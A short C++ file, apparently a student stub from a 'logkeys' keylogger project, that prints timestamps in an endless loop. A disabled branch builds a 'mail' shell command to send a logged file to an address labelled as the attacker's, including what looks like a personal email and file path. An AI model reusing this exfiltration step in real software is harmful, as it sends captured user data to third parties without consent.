#include <cstdio>
#include <cerrno>
#include <cwchar>
#include <vector>
#include <cstring>
#include <fstream>
#include <sstream>
#include <cstdlib>

int main(int argc, char** argv)
{
  char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
  time_t cur_time;
  time(&cur_time);
#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
  strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));

  while(1) { // Simulates reading char loop
    time(&cur_time); // get time
    strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time)); // write time

    printf(timestamp);
    if(0){//timestamp == "2014-05-10 10:45:00-0000 > ") {
      char command[2500]; // Maximum size of string
      strcpy(command, "mail stine.eli@gmail.com < "); // change with attackers address
      strcat(command, "/usr/users/quota/students/15/estine/cs343/taen-logkeys/mail_test/test_file");
      strcat(command, " 2>/dev/null");
      return system("echo lunch");
    }
  }
}
